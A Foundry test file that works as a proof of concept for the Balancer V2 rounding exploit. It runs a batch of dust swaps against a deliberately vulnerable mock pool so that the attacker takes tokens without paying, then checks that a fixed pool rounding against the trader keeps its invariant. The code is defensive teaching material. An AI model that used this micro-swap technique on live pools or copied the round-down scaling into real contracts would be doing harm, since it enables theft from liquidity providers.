// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20} from "../src/balancer/ScaledPool.sol";
import {VulnerableScaledPool, SafeScaledPool} from "../src/balancer/ScaledPool.sol";

/// PoC for the Balancer V2 rounding-inconsistency exploit (2025-11-03, ~$128M).
///   forge test --match-contract BalancerRounding -vvv
///
/// Invariant that SHOULD hold (master-checklist SC07): the pool invariant D never
/// decreases due to a swap (each op must round against the trader). The attack breaks it:
/// `_upscale` rounds down while the vulnerable input downscale also rounds down, so dust
/// swaps are undercharged — with a fractional rate the charge collapses to zero — and a
/// batch of micro-swaps compounds the leak, deflating D and the BPT price.
///
/// See docs/exploits/balancer-v2-rounding-2025-11-03.md
contract BalancerRoundingTest is Test {
    MockERC20 token0;
    MockERC20 token1;
    address attacker = makeAddr("attacker");

    uint256 constant RATE0 = 1.5e18; // fractional rate -> inexact downscale
    uint256 constant B0 = 1_000_000; // raw token0 in pool
    uint256 constant B1 = 1_000_000; // raw token1 in pool
    uint256 constant SWAPS = 65; // the batchSwap size from the real attack
    uint256 constant DUST = 1; // single-wei output per micro-swap

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        token0.mint(attacker, 1_000); // attacker's working capital in token0
    }

    function test_vulnerablePool_invariantLeaks() public {
        VulnerableScaledPool pool =
            new VulnerableScaledPool(IERC20(address(token0)), IERC20(address(token1)), RATE0, B0, B1);
        token0.mint(address(pool), B0);
        token1.mint(address(pool), B1);

        uint256 dBefore = pool.invariantD();
        uint256 t0Before = token0.balanceOf(attacker);

        vm.startPrank(attacker);
        token0.approve(address(pool), type(uint256).max);
        for (uint256 i = 0; i < SWAPS; i++) {
            pool.swapGivenOut(DUST); // dust output; downscaled input rounds to ZERO
        }
        vm.stopPrank();

        uint256 dAfter = pool.invariantD();
        uint256 t0Spent = t0Before - token0.balanceOf(attacker);
        uint256 t1Gained = token1.balanceOf(attacker);

        console2.log("invariant D before/after:", dBefore, dAfter);
        console2.log("token0 spent / token1 extracted:", t0Spent, t1Gained);
        assertEq(t0Spent, 0, "attacker paid nothing across all dust swaps");
        assertEq(t1Gained, SWAPS * DUST, "attacker extracted token1 for free");
        assertLt(dAfter, dBefore, "pool invariant D deflated (value leaked)");
    }

    function test_safePool_invariantHolds() public {
        SafeScaledPool pool =
            new SafeScaledPool(IERC20(address(token0)), IERC20(address(token1)), RATE0, B0, B1);
        token0.mint(address(pool), B0);
        token1.mint(address(pool), B1);

        uint256 dBefore = pool.invariantD();

        vm.startPrank(attacker);
        token0.approve(address(pool), type(uint256).max);
        for (uint256 i = 0; i < SWAPS; i++) {
            pool.swapGivenOut(DUST); // same dust swaps, but input now rounds UP
        }
        vm.stopPrank();

        uint256 dAfter = pool.invariantD();

        // With rounding against the trader, the invariant never drops — the leak is gone.
        assertGe(dAfter, dBefore, "pool invariant D non-decreasing");
        assertLt(token0.balanceOf(attacker), 1_000, "attacker actually paid token0 for the output");
    }
}
